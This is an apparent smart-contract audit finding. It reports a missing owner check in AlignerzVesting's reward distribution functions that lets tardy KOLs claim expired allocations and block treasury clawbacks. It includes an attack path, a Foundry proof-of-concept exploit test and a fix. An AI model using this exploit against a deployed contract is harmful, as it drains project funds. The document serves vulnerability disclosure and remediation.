# [000202] [High]   Anyone can resurrect expired KOL claims and block clawbacks
  
  ### Summary

 Missing access control in `distributeRewardTVS`/`distributeStablecoinAllocation` (`protocol/src/contracts/vesting/AlignerzVesting.sol:522-549`) will cause the reward-project treasury to lose its unclaimed allocations because any tardy KOL (or helper) can call these functions after `claimDeadline` and force `_claimRewardTVS`/`_claimStablecoinAllocation` to execute, even though the normal claim functions revert once the deadline passes.

### Root Cause

In `protocol/src/contracts/vesting/AlignerzVesting.sol:522-549` the `distributeRewardTVS` and `distributeStablecoinAllocation` functions that are documented as “Allows the owner…” are declared `external` with no `onlyOwner` modifier. Once `block.timestamp > claimDeadline`, they forward arbitrary caller-supplied address arrays into `_claimRewardTVS`/`_claimStablecoinAllocation`, minting NFTs and sending tokens exactly as if the deadline never existed.

### Internal Pre-conditions

1. Owner needs to call `launchRewardProject` and set `startTime`/`claimWindow` so that `rewardProjects[projectId].claimDeadline` is in the future.
2. Owner needs to fund and call `setTVSAllocation` / `setStablecoinAllocation` so `kolTVSRewards[kol]` or `kolStablecoinRewards[kol]` hold positive balances.
3. Time must advance so that `block.timestamp` becomes strictly greater than `claimDeadline`, causing `claimRewardTVS`/`claimStablecoinAllocation` to revert with `Deadline_Has_Passed`.


### External Pre-conditions

None. All data needed to build the `kol` arrays (e.g. `kolTVSAddresses`) is available via public getters, and no oracle or external price assumption is required.

### Attack Path

 1. Tardy KOL  observes that `rewardProjects[projectId].claimDeadline` has passed and reads `kolTVSAddresses` / `kolStablecoinAddresses` from the public mapping.
2. Attacker calls `distributeRewardTVS(projectId, kolArray)` supplying the outstanding addresses, bypassing the `claimRewardTVS` restriction because `distributeRewardTVS` lacks `onlyOwner`.
3. `_claimRewardTVS` mints an NFT and records the vesting allocation for each tardy KOL exactly as if they had been punctual, zeroing their `kolTVSRewards`.
4. Attacker similarly calls `distributeStablecoinAllocation` so `_claimStablecoinAllocation` pays out the stablecoin balances.
5. Owner can no longer recover those amounts through `distributeRemainingRewardTVS` / `distributeRemainingStablecoinAllocation` because the allocations have been fully claimed and removed from the tracking arrays.

### Impact

The reward project treasury cannot claw back any expired allocations because tardy KOLs can self-distribute immediately after the deadline, resulting in a loss of up to the entire unclaimed TVS and stablecoin balances for each reward project. The attacker (tardy KOL) receives their full allocation despite missing the claim window, and the protocol loses the ability to reassign or reclaim those funds.

### PoC

forge test --match-test test_TardyKOLCanSelfDistributePostDeadline -vvvv


```solidity
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {CompleteMerkle} from "murky/src/CompleteMerkle.sol";

contract AlignerzVestingProtocolTest is Test {
    AlignerzVesting public vesting;
    Aligners26 public token;
    AlignerzNFT public nft;
    MockUSD public usdt;

    address public owner;
    address public projectCreator;
    address[] public bidders;

    // Constants
    uint256 constant NUM_BIDDERS = 20;
    uint256 constant TOKEN_AMOUNT = 26_000_000 ether;
    uint256 constant BIDDER_USD = 1_000 ether;
    uint256 constant PROJECT_ID = 0;

    // Project structure for organization
    struct BidInfo {
        address bidder;
        uint256 amount;
        uint256 vestingPeriod;
        uint256 poolId;
        bool accepted;
    }

    // Track allocated bids and their proofs
    mapping(address => bytes32[]) public bidderProofs;
    mapping(address => uint256) public bidderPoolIds;
    mapping(address => uint256) public bidderNFTIds;
    bytes32 public refundRoot;

    function setUp() public {
        owner = address(this);
        projectCreator = makeAddr("projectCreator");
        vm.deal(projectCreator, 100 ether);

        // Deploy contracts
        usdt = new MockUSD();
        token = new Aligners26("26Aligners", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        address implementation = address(new AlignerzVesting());
        bytes memory initData = abi.encodeCall(AlignerzVesting.initialize, (address(nft)));
        address payable proxy = payable(new ERC1967Proxy(implementation, initData));
        vesting = AlignerzVesting(proxy);

        // Set NFT minter to vesting contract
        vm.prank(owner);
        nft.addMinter(proxy);
        vesting.setTreasury(address(1));

        // Create bidders with ETH and USDT
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            address bidder = makeAddr(string.concat("bidder", vm.toString(i)));
            vm.deal(bidder, 50 ether);
            bidders.push(bidder);
            usdt.mint(bidder, BIDDER_USD);
        }

        // Mint tokens for project creator
        token.transfer(projectCreator, TOKEN_AMOUNT);
        vesting.transferOwnership(projectCreator);

        // Approve tokens for vesting contract
        vm.prank(projectCreator);
        token.approve(address(vesting), TOKEN_AMOUNT);
    }

    // Helper function to create a leaf node for the merkle tree
    function getLeaf(address bidder, uint256 amount, uint256 projectId, uint256 poolId)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(bidder, amount, projectId, poolId));
    }

    // Helper for generating merkle proofs
    function generateMerkleProofs(BidInfo[] memory bids, uint256 poolId) internal returns (bytes32) {
        bytes32[] memory leaves = new bytes32[](bids.length);
        uint256 leafCount = 0;

        // Create leaves for each bid in this pool
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                leaves[leafCount] = getLeaf(bids[i].bidder, bids[i].amount, PROJECT_ID, poolId);

                bidderPoolIds[bids[i].bidder] = poolId;
                leafCount++;
            }
        }

        CompleteMerkle m = new CompleteMerkle();
        bytes32 root = m.getRoot(leaves);
        uint256 indexTracker = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                bytes32[] memory proof = m.getProof(leaves, indexTracker);
                bidderProofs[bids[i].bidder] = proof;
                indexTracker++;
            }
        }

        return root;
    }

    // Helper for generating refund proofs
    function generateRefundProofs(BidInfo[] memory bids) internal returns (bytes32) {
        bytes32[] memory leaves = new bytes32[](bids.length);
        uint256 leafCount = 0;
        uint256 poolId = 0;

        // Create leaves for each bid in this pool
        for (uint256 i = 0; i < bids.length; i++) {
            if (!bids[i].accepted) {
                leaves[leafCount] = getLeaf(bids[i].bidder, bids[i].amount, PROJECT_ID, poolId);

                bidderPoolIds[bids[i].bidder] = poolId;
                leafCount++;
            }
        }

        CompleteMerkle m = new CompleteMerkle();
        bytes32 root = m.getRoot(leaves);
        uint256 indexTracker = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (!bids[i].accepted) {
                bytes32[] memory proof = m.getProof(leaves, indexTracker);
                bidderProofs[bids[i].bidder] = proof;
                indexTracker++;
            }
        }

        return root;
    }

    function test_CompleteVestingFlow() public {
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        // 1. Launch project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);

        // 2. Create multiple pools with different prices
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
        vesting.createPool(PROJECT_ID, 4_000_000 ether, 0.03 ether, false);

        // 3. Place bids from different whitelisted users
        vesting.addUsersToWhitelist(bidders, PROJECT_ID);
        vm.stopPrank();
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            vm.startPrank(bidders[i]);

            // Approve and place bid
            usdt.approve(address(vesting), BIDDER_USD);

            // Different vesting periods to test variety
            uint256 vestingPeriod = (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days;

            vesting.placeBid(PROJECT_ID, BIDDER_USD, vestingPeriod);
            vm.stopPrank();
        }

        // 4. Update some bids
        vm.prank(bidders[0]);
        vesting.updateBid(PROJECT_ID, BIDDER_USD, 180 days);

        // 5. Prepare bid allocations (this would be done off-chain)
        BidInfo[] memory allBids = new BidInfo[](NUM_BIDDERS);

        // Simulate off-chain allocation process
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            // Assign bids to pools (in reality, this would be based on some algorithm)
            uint256 poolId = i % 3;
            bool accepted = i < 15; // First 15 bidders are accepted

            allBids[i] = BidInfo({
                bidder: bidders[i],
                amount: BIDDER_USD, // For simplicity, all bids are the same amount
                vestingPeriod: (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days,
                poolId: poolId,
                accepted: accepted
            });
        }

        // 6. Generate merkle roots for each pool
        bytes32[] memory poolRoots = new bytes32[](3);
        for (uint256 poolId = 0; poolId < 3; poolId++) {
            poolRoots[poolId] = generateMerkleProofs(allBids, poolId);
        }

        // 7. Generate refund proofs
        refundRoot = generateRefundProofs(allBids);

        // 8. Finalize project with merkle roots
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);
        uint256[] memory nftIds = new uint256[](15);
        // 9. Users claim NFTs with proofs
        for (uint256 i = 0; i < 15; i++) {
            // Only accepted bidders
            address bidder = bidders[i];
            uint256 poolId = bidderPoolIds[bidder];

            vm.prank(bidder);
            uint256 nftId = vesting.claimNFT(PROJECT_ID, poolId, BIDDER_USD, bidderProofs[bidder]);
            nftIds[i] = nftId;
            vm.prank(bidder);
            //(uint256 oldNft, uint256 newNft) = vesting.splitTVS(PROJECT_ID, nftId, 5000);
            //assertEq(oldNft, nftId);
            bidderNFTIds[bidder] = nftId;

            // Verify NFT ownership
            assertEq(nft.ownerOf(nftId), bidder);
        }

        // 10. Some users try to claim refunds
        for (uint256 i = 15; i < NUM_BIDDERS; i++) {
            // Only Refunded bidders
            address bidder = bidders[i];
            vm.prank(bidder);
            vesting.claimRefund(PROJECT_ID, BIDDER_USD, bidderProofs[bidder]);

            // Verify USDT was returned
            assertEq(usdt.balanceOf(bidders[i]), BIDDER_USD);
        }

        // 11. Fast forward time to simulate vesting period
        vm.warp(block.timestamp + 60 days);

        // 12. Users claim tokens after vesting period
        for (uint256 i = 0; i < 15; i++) {
            address bidder = bidders[i];
            //uint256 nftId = bidderNFTIds[bidder];

            uint256 tokenBalanceBefore = token.balanceOf(bidder);

            vm.prank(bidder);
            vesting.claimTokens(PROJECT_ID, nftIds[i]);

            uint256 tokenBalanceAfter = token.balanceOf(bidder);
            assertTrue(tokenBalanceAfter > tokenBalanceBefore, "No tokens claimed");
        }

        // 13. Fast forward more time to simulate complete vesting
        vm.warp(block.timestamp + 365 days);

        // 14. Users claim remaining tokens
        for (uint256 i = 0; i < 15; i++) {
            address bidder = bidders[i];
            uint256 nftId = bidderNFTIds[bidder];

            // Skip if NFT was already burned due to full claim
            if (nftId == 0) continue;

            try nft.ownerOf(nftId) returns (address ownerOf) {
                if (ownerOf == bidder) {
                    vm.prank(bidder);
                    vesting.claimTokens(PROJECT_ID, nftId);
                }
            } catch {
                // NFT was already burned, which means tokens were fully claimed
            }
        }

        // 15. Update project allocations (optional test)
        bytes32[] memory newPoolRoots = new bytes32[](3);
        for (uint256 i = 0; i < 3; i++) {
            newPoolRoots[i] = keccak256(abi.encodePacked("new_pool_root", i));
        }

        vm.prank(projectCreator);
        vesting.updateProjectAllocations(PROJECT_ID, keccak256(abi.encodePacked("new_refund_root")), newPoolRoots);
    }


function test_TardyKOLCanSelfDistributePostDeadline() public {
        address tardyKol = bidders[0];
        uint256 projectId = vesting.rewardProjectCount();
        uint256 startTime = block.timestamp + 10;
        uint256 claimWindow = 3 days;
        uint256 tvsAmount = 1_000 ether;
        uint256 stableAmount = 500 ether;

        // Fund project creator with stablecoins for the allocation
        usdt.mint(projectCreator, stableAmount);

        vm.startPrank(projectCreator);
        vesting.launchRewardProject(address(token), address(usdt), startTime, claimWindow);

        address[] memory kolAddresses = new address[](1);
        kolAddresses[0] = tardyKol;
        uint256[] memory tvsAmounts = new uint256[](1);
        tvsAmounts[0] = tvsAmount;
        vesting.setTVSAllocation(projectId, tvsAmount, 30 days, kolAddresses, tvsAmounts);

        address[] memory stableKolAddresses = new address[](1);
        stableKolAddresses[0] = tardyKol;
        uint256[] memory stableAmounts = new uint256[](1);
        stableAmounts[0] = stableAmount;
        usdt.approve(address(vesting), stableAmount);
        vesting.setStablecoinAllocation(projectId, stableAmount, stableKolAddresses, stableAmounts);
        vm.stopPrank();

        // Deadline passes
        vm.warp(startTime + claimWindow + 1);

        vm.startPrank(tardyKol);
        vm.expectRevert(AlignerzVesting.Deadline_Has_Passed.selector);
        vesting.claimRewardTVS(projectId);
        vm.expectRevert(AlignerzVesting.Deadline_Has_Passed.selector);
        vesting.claimStablecoinAllocation(projectId);

        address[] memory tardyList = new address[](1);
        tardyList[0] = tardyKol;

        uint256 stableBalanceBefore = usdt.balanceOf(tardyKol);
        vesting.distributeRewardTVS(projectId, tardyList);
        assertEq(nft.balanceOf(tardyKol), 1, "Late KOL minted NFT post-deadline");

        vesting.distributeStablecoinAllocation(projectId, tardyList);
        uint256 stableBalanceAfter = usdt.balanceOf(tardyKol);
        assertEq(stableBalanceAfter, stableBalanceBefore + stableAmount, "Late KOL received stablecoins");
        vm.stopPrank();

        // Funds are gone from the contract; nothing left for the owner to claw back
        assertEq(usdt.balanceOf(address(vesting)), 0, "Contract still holds stablecoin allocation");
    }


```

### Mitigation

Gate distributeRewardTVS and distributeStablecoinAllocation behind onlyOwner (or remove them entirely) so only the team can decide whether to honor late claims; that restores the claim-deadline invariant and keeps unclaimed balances recoverable via the existing owner-only distributeRemaining* paths.
  